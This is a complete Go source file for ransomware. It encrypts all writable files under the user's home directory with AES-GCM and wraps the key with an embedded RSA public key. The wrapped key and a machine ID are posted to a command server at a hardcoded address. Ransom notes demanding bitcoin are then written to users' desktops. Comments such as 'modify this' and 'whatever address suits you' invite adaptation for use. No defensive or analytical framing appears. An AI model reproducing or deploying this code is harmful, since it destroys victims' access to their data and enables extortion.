package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"time"
)

func fromBase10(base10 string) *big.Int {
	i, ok := new(big.Int).SetString(base10, 10)
	if !ok {
		panic("bad number: " + base10)
	}
	return i
}

var Key rsa.PublicKey

func init() {
	Key = rsa.PublicKey{
		N: fromBase10("26813578530985654902945536004162652196181891696705616368489217231832719107178171184637007640539612366358242413637320017272468945068480550352078077546799623750147897670718962085396318728008493834109401984948667155315534935203142433023298250979664020670702906771281314795880320567396089817688698345830614959603791006522060003353718434118908320028628849126222758475667341668882631997550451066312008378159917890844790435917249434007494707318518844049782436260451802782044631197952381833373106718801839594554312934486741105815681151810050947757663592446141123725404273355256546814368135486887315872338046012640600133935733"), // modify this
		E: 65537,
	}
}

func visit(files *[]string) filepath.WalkFunc {
	return func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Fatal(err)
		}
		if info.IsDir() {
			return nil
		}
		ex, err := os.Executable()
		if err != nil {
			panic(err)
		}
		if path == ex {
			return nil
		}
		if filepath.Base(path) == "decrypt.exe" {
			return nil
		}
		if info.Mode().Perm()&(1<<(uint(7))) == 0 { // black magic to check whether we have write permissions.
			return nil
		}

		*files = append(*files, path)
		return nil
	}
}

// NewEncryptionKey generates a random 256-bit key for Encrypt() and
// Decrypt(). It panics if the source of randomness fails.
func NewEncryptionKey() *[32]byte {
	key := [32]byte{}
	_, err := io.ReadFull(rand.Reader, key[:])
	if err != nil {
		panic(err)
	}
	return &key
}

// Encrypt encrypts data using 256-bit AES-GCM.  This both hides the content of
// the data and provides a check that it hasn't been altered. Output takes the
// form nonce|ciphertext|tag where '|' indicates concatenation.
func Encrypt(plaintext []byte, key *[32]byte) (ciphertext []byte, err error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

type PaymentInfo struct {
	Address string
	Amount  string
}

var server string = "192.168.0.111:1337" // server address
var contact string = "keksec@kek.hq"     // whatever address suits you

func main() {
	var files []string
	var counter int = 1
	var home string

	randomKey := NewEncryptionKey()

	if runtime.GOOS == "windows" {
		home = os.Getenv("HOMEDRIVE") + "Users/"
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
	} else {
		home = os.Getenv("HOME")
	}

	err := filepath.Walk(home, visit(&files))
	if err != nil {
		panic(err)
	}
	for _, file := range files {
		fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)

		data, err := ioutil.ReadFile(file)
		if err != nil {
			continue
		}

		encrypted, err := Encrypt(data, randomKey)
		if err != nil {
			log.Println(err)
			continue
		}

		err = ioutil.WriteFile(file, encrypted, 0644)
		if err != nil {
			continue
		}
		counter++
	}
	fmt.Printf("\n%d files encrypted.\n", len(files))

	encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &Key, randomKey[:], nil)
	if err != nil {
		log.Fatal(err)
	}
	randomKey = nil // clear key

	id, err := machineid.ID()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Sending key away.")

	for {
		response, err := http.PostForm("http://"+server+"/key/", url.Values{
			"key": {hex.EncodeToString(encryptedKey)},
			"id":  {id},
		})
		if err != nil {
			if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
				ioutil.WriteFile("key.txt", []byte(hex.EncodeToString(encryptedKey)), 0644)
			}

			fmt.Println("Connection failed. Retrying in 5 seconds..")
			time.Sleep(5 * time.Second)
			continue
		}
		defer response.Body.Close()
		if _, err := os.Stat("key.txt"); !os.IsNotExist(err) {
			err = os.Remove("key.txt")
			if err != nil {
				log.Fatal(err)
			}
		}
		fmt.Println("Connection established. Payment information received..")

		payment := new(PaymentInfo)

		err = json.NewDecoder(response.Body).Decode(&payment)
		if err != nil {
			log.Fatal(err)
		}
		text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id

		if runtime.GOOS == "windows" {
			users, err := ioutil.ReadDir(home)
			if err != nil {
				log.Fatal(err)
			}

			for _, user := range users {
				if user.IsDir() {
					ioutil.WriteFile(home+user.Name()+"\\Desktop\\README.txt", []byte(text), 0644)
				}
			}

		} else {
			ioutil.WriteFile(home+"/README.txt", []byte(text), 0644)
		}
		fmt.Println("Script execution completed successfully!")

		break
	}

	encryptedKey = nil
}
